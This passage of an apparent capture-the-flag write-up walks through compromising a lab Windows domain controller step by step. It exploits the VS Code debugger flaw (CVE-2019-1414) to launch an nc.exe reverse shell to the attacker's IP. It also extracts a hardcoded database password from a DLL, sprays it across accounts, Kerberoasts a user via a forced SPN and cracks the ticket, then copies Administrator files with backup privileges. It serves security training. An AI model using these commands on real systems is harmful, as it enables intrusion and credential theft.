    189      16     3776      14896              2528   0 svchost
    194      14     4728      11636              2644   0 svchost
    288      18     4368      19100              4912   1 svchost
    972       0      124        136                 4   0 System
    232      16     2884      13536              4868   1 taskhostw
    196      16     2364      10696              3188   0 vds
    140      11     3080      10208              2576   0 VGAuthService
    105       7     1368       5656              1156   0 vm3dservice
    105       8     1496       6660              4276   1 vm3dservice
    341      21    10560      22540              2652   0 vmtoolsd
    201      17     4956      14744              4320   1 vmtoolsd
     92       8      932       4864               484   0 wininit
    202      10     2120      10288               560   1 winlogon
    316      15     7240      16260              3084   0 WmiPrvSE
    717      35    56908      80072       3.13   2680   0 wsmprovhost
    260      11     1884       7904              1248   0 WUDFHost
```

Looking at the listening ports, there are some interesting ports listening on `127.0.0.1`: `5237` and `35050`. However, after a couple of minutes, there are other ports listening instead of these two. It appears that Visual Studio Code is running on a scheduled task and opening up new ports every few minutes.

```powershell
*Evil-WinRM* PS C:\program files> netstat -ano | select-string LISTEN | select-string 127.0.0.1

  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2444
  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       1356
  TCP    127.0.0.1:5237         0.0.0.0:0              LISTENING       2340
  TCP    127.0.0.1:35050        0.0.0.0:0              LISTENING       2836
```

All of this seems to indicate `CVE-2019-1414`, which was a vulnerability in Visual Studio Code where Visual Studio Code's debugging server was listening by default on random ports on `localhost`. A local attacker can connect to the debugging server and send it arbitrary `Node.js` code to be executed in the context of the Visual Studio Code process. All of this was explored in [this blog post](https://iwantmore.pizza/posts/cve-2019-1414.html) and leads to [this Github repository](https://github.com/taviso/cefdebug), which includes a binary, `cefdebug.exe`, which can be executed locally on the target to interact with the Visual Studio Code debugging server.

First, retrieve the port that the Visual Studio Code debugging server is listening on.
In this example, use the above port of `35050`. Submit an HTTP request to the `/json` path on this port to determine the Visual Studio Code debugging server websocket endpoint, which is `ws://127.0.0.1:4438/48be4c0c-9c8d-46e5-92a6-1f4a1ed8f87c` in this example.

```powershell
*Evil-WinRM* PS C:\program files> (Invoke-WebRequest -Uri http://127.0.0.1:4438/json).Content
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "chrome-devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:4438/48be4c0c-9c8d-46e5-92a6-1f4a1ed8f87c",
  "devtoolsFrontendUrlCompat": "chrome-devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:4438/48be4c0c-9c8d-46e5-92a6-1f4a1ed8f87c",
  "faviconUrl": "https://nodejs.org/static/favicon.ico",
  "id": "48be4c0c-9c8d-46e5-92a6-1f4a1ed8f87c",
  "title": "Node.js[5916]",
  "type": "node",
  "url": "file://",
  "webSocketDebuggerUrl": "ws://127.0.0.1:4438/48be4c0c-9c8d-46e5-92a6-1f4a1ed8f87c"
} ]
```

On the attacking machine, start `impacket`'s `smbserver` and serve both `cefdebug.exe` and `nc.exe` compiled for Windows.

```bash
$ cp /usr/share/windows-binaries/nc.exe .
$ sudo impacket-smbserver tgihf .
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Start a reverse shell listener.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Execute `cefdebug.exe` on the target and pass it the websocket endpoint to execute `nc.exe` and send a reverse shell to the attacking machine.

```powershell
*Evil-WinRM* PS C:\Users\alcibiades\Documents> \\10.10.14.70\tgihf\cefdebug.exe --url ws://127.0.0.1:42435/6536a7c4-4a6a-43eb-9f1d-328d6d2bff23 --code "process.mainModule.require('child_process').execSync('\\\\10.10.14.70\\tgihf\\nc.exe -e cmd.exe 10.10.14.70 443')"
```

The resultant shell is in the context of the user `cyork`.

---

## Reverse Engineering the Colleague API

`cyork` is in the `Developers` group and as a result has access to the `C:\inetpub` folder. The `C:\inetpub\wwwroot\bin\MultimasterAPI.dll` file seems interesting. Exfiltrate it to the attacking machine and determine that it is a .NET assembly.

```bash
$ file MultimasterAPI.dll
MultimasterAPI.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

Opening up `MultimasterAPI.dll` in `dnSpy` and navigating to the `MultimasterAPI.Controllers` section shows the code for the `getColleagues` API endpoint, which reveals the password used to connect to the SQL database: `D3veL0pM3nT!`.

```c#
...
List<Colleague> list = new List<Colleague>();
string connectionString = "server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;"; 
SqlConnection sqlConnection = new SqlConnection(connectionString);  string arg = data["name"].ToString();
string cmdText = string.Format("Select * from Colleagues where name like '%{0}%'", arg);
SqlCommand sqlCommand = new SqlCommand(cmdText, sqlConnection);
...
```

Using `crackmapexec` to pass the password around with the various discovered usernames indicates that the credential `sbauer`:`D3veL0pM3nT!` is valid.

```bash
$ crackmapexec smb 10.129.95.200 -d megacorp.local -u users.txt -p 'D3veL0pM3nT!'
SMB         10.129.95.200   445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:megacorp.local) (signing:True) (SMBv1:True)
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\james:D3veL0pM3nT! STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\kpage:D3veL0pM3nT! STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\zac:D3veL0pM3nT! STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\rmartin:D3veL0pM3nT! STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [+] megacorp.local\sbauer:D3veL0pM3nT!
```

---

## Kerberoasting `jorden`

BloodHound indicates that `sbauer` has `GenericWrite` access to `jorden`, who is a member of the `Server Operators` group. With `GenericWrite` access, `sbauer` can set a service principal name (SPN) on `jorden` and then Kerberoast `jorden` by retrieving a service ticket encrypted with `jorden`'s password hash and cracking it offline. From an attacking Windows machine with `PowerView` and connectivity to the domain controller, add the SPN to `jorden`.

```powershell
PS C:\Users\tgihf> $password = ConvertTo-SecureString "D3veL0pM3nT!" -AsPlainText -Force
PS C:\Users\tgihf> $credential = New-Object System.Management.Automation.PSCredential("megacorp.local\sbauer", $password)
PS C:\Users\tgihf> . .\PowerView.ps1
PS C:\Users\tgihf> Set-DomainObject -Identity jorden -Set @{serviceprincipalname="HOST/blahbllah"} -Domain megacorp.local -Server 10.129.95.200 -Credential $credential
```

Confirm that the SPN was properly set.

```powershell
PS C:\Users\tgihf> Get-DomainUser -Identity jorden -Domain megacorp.local -Server 10.129.95.200 -Credential $credential


logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=Jorden Mclean,OU=Athens,OU=Employees,DC=MEGACORP,DC=LOCAL
objectclass           : {top, person, organizationalPerson, user}
displayname           : Jorden Mclean
lastlogontimestamp    : 1/9/2020 7:14:13 PM
userprincipalname     : jorden@MEGACORP.LOCAL
name                  : Jorden Mclean
objectsid             : S-1-5-21-3167813660-1240564177-918740779-3110
samaccountname        : jorden
admincount            : 0
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 11/26/2021 6:53:09 AM
instancetype          : 4
usncreated            : 90365
objectguid            : 0fa62545-eff1-4805-b16f-a18cf4217418
sn                    : Mclean
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
dscorepropagationdata : {1/10/2020 12:59:48 AM, 1/9/2020 11:56:27 PM, 1/9/2020 11:09:16 PM, 1/9/2020 8:07:19 PM...}
serviceprincipalname  : HOST/blahblah
givenname             : Jorden
memberof              : {CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL, CN=Server Operators,CN=Builtin,DC=MEGACORP,DC=LOCAL, CN=Remote Management
                        Users,CN=Builtin,DC=MEGACORP,DC=LOCAL}
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : Jorden Mclean
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 1/9/2020 12:26:42 PM
primarygroupid        : 513
pwdlastset            : 1/9/2020 6:48:17 PM
usnchanged            : 282775
```

From an attacking Linux machine with connectivity to the domain controller, retrieve a service ticket encrypted with `jorden`'s password hash.

```bash
$ impacket-GetUserSPNs megacorp.local/sbauer:'D3veL0pM3nT!' -dc-ip 10.129.95.200 -request-user jorden -debug
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Connecting to 10.129.95.200, port 389, SSL False
[+] Total of records returned 4
ServicePrincipalName  Name    MemberOf                                      PasswordLastSet             LastLogon  Delegation
--------------------  ------  --------------------------------------------  --------------------------  ---------  ----------
HOST/two              jorden  CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL  2020-01-09 18:48:17.503303  <never>



[+] Trying to connect to KDC at 10.129.95.200
[+] Trying to connect to KDC at 10.129.95.200
[+] Trying to connect to KDC at 10.129.95.200
$krb5tgs$23$*jorden$MEGACORP.LOCAL$megacorp.local/jorden*$6b4389a2d08dd9dcaf5264a2711d9938$2ce8680cbbd6d3bbf594a7c3ffd95027edd6d27b2bce347b26200307a3489eaa2b47bc004bb39610194225b30a729980a21bbc608df49a548ba84a9dddedf0055b07227d14f0e83c8ad6f4225f55075d414d8c1a37dafa17914807525ccc4a97da0c4b370009c01bc7803d85b2e06f2e51297ed054757f93b40b478c9c3700abda6f0ca081e2a25a909a4eaff52187c7ccf933596fdbe71a8ba6fcf07e11ee0a47e968cb2e3b9c72fde143cd766717b288be106e00ccf83099048af08c43feb381ce628364064e03315913ab68bd5cfdc64234aa9d77faf03b3548028d40b522fc2bb33f31936df743e7c86f4c25bae4f4fee54a476994beb328d93d25013f2da9604675444e4c390d2dabd9185c478cd88d2871c22fbf6e202fa5c03c9d8b6b4dd6532f3da5ed9bc2bd1419e8db793fb29ff3f417d23eb778636298c323374ad215e5a4fa4eb62a33e882c05b1af183182cbe111a0cb75dd7680bc8c52beb8a05469c8ce0bbc0a7dec0cdeff9b0790f84fb409dd4726717413741e9aec2474efd8e2b0f51c0d73e0b3011513f35e10f4d8d2b24eb68f108999c07a9e965fe882b1c2ea578972b1774015f7791f75737b981437cc10bf9619d457e083b9b03dc535b7b97f17abf3d3a0cbab621bf108e67cd3afa49049e3e4e5051fc9ec519716176807c01ba1e7a808f14c0f555cfac6a44851f8457c9e93ee60cb8cb4ce07a805dabffcf5dfdd27fbfb1e53e3f92c4f52dabb77790518c1fd595adc35fb03f6ac3a4cda6b5158a3777eeb5bfc9e869c4c0326f246141f3b8c748ac889ffd9ec7a63a96f736c551667c9b54ec5fe30e1138d66c7ce04e4f9f9a95546daf7352fe88c040092f08a7968988375e87f095f0c563b12e1a22bf0bb2ce5fa87b8a9e51d1dbbdbfe8a729ded4dcc1bbf49dd661f4582d3cbde94b9aec22b084a65535147973ef55e0d1367edbf4b4fd48d844cb3a29769336c637692e3825f644f1a64bb6b32e28fd90bc2cdc6103b45304e9ed2f0ac24c11362c5b93dfab09658f3613959d10122bd11ae0c57ac6e78030eeff57be03dcc7a0da2fee1a412ac0992136222eb55d7140de08276772679bc08b8e2006f84248b2f443529bdb8e65614ea6d2316a901fba67312d8fb4e190817b6e14c1bcde570a4dfef3b460ab7c269ac9a7159adb88ad3623b7e5105683d3e769c0f6daaf4c059270fb90f18c96edd728af1ea597843d413cc3260894bc5851c7f73b16eb0cd410255dc381f0aea8c269a7c61bf5e4c1f1707e28345ed93505502076704c754355519807c6005eeb2a0bf7772b93ce16c0ac1a251badf01bc47e380e093fc0753b1c8568d09db6aa8a7a2e20f38493a9c0f9ea33e758
```

Attempt to crack the service ticket to recover `jorden`'s password: `rainforest786`.

```bash
$ hashcat -a 0 -m 13100 '$krb5tgs$23$*jorden$MEGACORP.LOCAL$megacorp.local/jorden*$6b4389a2d08dd9dcaf5264a2711d9938$2ce8680cbbd6d3bbf594a7c3ffd95027edd6d27b2bce347b26200307a3489eaa2b47bc004bb39610194225b30a729980a21bbc608df49a548ba84a9dddedf0055b07227d14f0e83c8ad6f4225f55075d414d8c1a37dafa17914807525ccc4a97da0c4b370009c01bc7803d85b2e06f2e51297ed054757f93b40b478c9c3700abda6f0ca081e2a25a909a4eaff52187c7ccf933596fdbe71a8ba6fcf07e11ee0a47e968cb2e3b9c72fde143cd766717b288be106e00ccf83099048af08c43feb381ce628364064e03315913ab68bd5cfdc64234aa9d77faf03b3548028d40b522fc2bb33f31936df743e7c86f4c25bae4f4fee54a476994beb328d93d25013f2da9604675444e4c390d2dabd9185c478cd88d2871c22fbf6e202fa5c03c9d8b6b4dd6532f3da5ed9bc2bd1419e8db793fb29ff3f417d23eb778636298c323374ad215e5a4fa4eb62a33e882c05b1af183182cbe111a0cb75dd7680bc8c52beb8a05469c8ce0bbc0a7dec0cdeff9b0790f84fb409dd4726717413741e9aec2474efd8e2b0f51c0d73e0b3011513f35e10f4d8d2b24eb68f108999c07a9e965fe882b1c2ea578972b1774015f7791f75737b981437cc10bf9619d457e083b9b03dc535b7b97f17abf3d3a0cbab621bf108e67cd3afa49049e3e4e5051fc9ec519716176807c01ba1e7a808f14c0f555cfac6a44851f8457c9e93ee60cb8cb4ce07a805dabffcf5dfdd27fbfb1e53e3f92c4f52dabb77790518c1fd595adc35fb03f6ac3a4cda6b5158a3777eeb5bfc9e869c4c0326f246141f3b8c748ac889ffd9ec7a63a96f736c551667c9b54ec5fe30e1138d66c7ce04e4f9f9a95546daf7352fe88c040092f08a7968988375e87f095f0c563b12e1a22bf0bb2ce5fa87b8a9e51d1dbbdbfe8a729ded4dcc1bbf49dd661f4582d3cbde94b9aec22b084a65535147973ef55e0d1367edbf4b4fd48d844cb3a29769336c637692e3825f644f1a64bb6b32e28fd90bc2cdc6103b45304e9ed2f0ac24c11362c5b93dfab09658f3613959d10122bd11ae0c57ac6e78030eeff57be03dcc7a0da2fee1a412ac0992136222eb55d7140de08276772679bc08b8e2006f84248b2f443529bdb8e65614ea6d2316a901fba67312d8fb4e190817b6e14c1bcde570a4dfef3b460ab7c269ac9a7159adb88ad3623b7e5105683d3e769c0f6daaf4c059270fb90f18c96edd728af1ea597843d413cc3260894bc5851c7f73b16eb0cd410255dc381f0aea8c269a7c61bf5e4c1f1707e28345ed93505502076704c754355519807c6005eeb2a0bf7772b93ce16c0ac1a251badf01bc47e380e093fc0753b1c8568d09db6aa8a7a2e20f38493a9c0f9ea33e758' rockyou.txt
$krb5tgs$23$*jorden$MEGACORP.LOCAL$megacorp.local/jorden*$6b4389a2d08dd9dcaf5264a2711d9938$2ce8680cbbd6d3bbf594a7c3ffd95027edd6d27b2bce347b26200307a3489eaa2b47bc004bb39610194225b30a729980a21bbc608df49a548ba84a9dddedf0055b07227d14f0e83c8ad6f4225f55075d414d8c1a37dafa17914807525ccc4a97da0c4b370009c01bc7803d85b2e06f2e51297ed054757f93b40b478c9c3700abda6f0ca081e2a25a909a4eaff52187c7ccf933596fdbe71a8ba6fcf07e11ee0a47e968cb2e3b9c72fde143cd766717b288be106e00ccf83099048af08c43feb381ce628364064e03315913ab68bd5cfdc64234aa9d77faf03b3548028d40b522fc2bb33f31936df743e7c86f4c25bae4f4fee54a476994beb328d93d25013f2da9604675444e4c390d2dabd9185c478cd88d2871c22fbf6e202fa5c03c9d8b6b4dd6532f3da5ed9bc2bd1419e8db793fb29ff3f417d23eb778636298c323374ad215e5a4fa4eb62a33e882c05b1af183182cbe111a0cb75dd7680bc8c52beb8a05469c8ce0bbc0a7dec0cdeff9b0790f84fb409dd4726717413741e9aec2474efd8e2b0f51c0d73e0b3011513f35e10f4d8d2b24eb68f108999c07a9e965fe882b1c2ea578972b1774015f7791f75737b981437cc10bf9619d457e083b9b03dc535b7b97f17abf3d3a0cbab621bf108e67cd3afa49049e3e4e5051fc9ec519716176807c01ba1e7a808f14c0f555cfac6a44851f8457c9e93ee60cb8cb4ce07a805dabffcf5dfdd27fbfb1e53e3f92c4f52dabb77790518c1fd595adc35fb03f6ac3a4cda6b5158a3777eeb5bfc9e869c4c0326f246141f3b8c748ac889ffd9ec7a63a96f736c551667c9b54ec5fe30e1138d66c7ce04e4f9f9a95546daf7352fe88c040092f08a7968988375e87f095f0c563b12e1a22bf0bb2ce5fa87b8a9e51d1dbbdbfe8a729ded4dcc1bbf49dd661f4582d3cbde94b9aec22b084a65535147973ef55e0d1367edbf4b4fd48d844cb3a29769336c637692e3825f644f1a64bb6b32e28fd90bc2cdc6103b45304e9ed2f0ac24c11362c5b93dfab09658f3613959d10122bd11ae0c57ac6e78030eeff57be03dcc7a0da2fee1a412ac0992136222eb55d7140de08276772679bc08b8e2006f84248b2f443529bdb8e65614ea6d2316a901fba67312d8fb4e190817b6e14c1bcde570a4dfef3b460ab7c269ac9a7159adb88ad3623b7e5105683d3e769c0f6daaf4c059270fb90f18c96edd728af1ea597843d413cc3260894bc5851c7f73b16eb0cd410255dc381f0aea8c269a7c61bf5e4c1f1707e28345ed93505502076704c754355519807c6005eeb2a0bf7772b93ce16c0ac1a251badf01bc47e380e093fc0753b1c8568d09db6aa8a7a2e20f38493a9c0f9ea33e758:rainforest786
```

---

## WinRM Access as `jorden` and Grabbing the System Flag

BloodHound indicates that `jorden` has `CanPSRemote` access and is a member of the `Server Operators` group.

```bash
$ evil-winrm -i 10.129.95.200 -u megacorp.local\\jorden -p rainforest786

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for Reline:Module

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\jorden\Documents>
```

As a member of the `Server Operators` group, `jorden` has both `SeBackupPrivilege` and `SeRestorePrivilege`, making it possible for them to backup a copy of the system flag from `Administrator`'s desktop.

```powershell
*Evil-WinRM* PS C:\Users\jorden\Documents> robocopy /b c:\users\administrator\desktop .

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, November 26, 2021 6:07:30 PM
   Source : c:\users\administrator\desktop\
     Dest : C:\Users\jorden\Documents\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           2    c:\users\administrator\desktop\
        *EXTRA Dir        -1    C:\Users\jorden\Documents\My Music\
        *EXTRA Dir        -1    C:\Users\jorden\Documents\My Pictures\
        *EXTRA Dir        -1    C:\Users\jorden\Documents\My Videos\
            New File                 488        desktop.ini
  0%
100%
            New File                  34        root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         3
   Files :         2         2         0         0         0         0
   Bytes :       522       522         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
   Ended : Friday, November 26, 2021 6:07:30 PM

*Evil-WinRM* PS C:\Users\jorden\Documents> ls


    Directory: C:\Users\jorden\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/26/2021   5:54 PM             34 root.txt
```
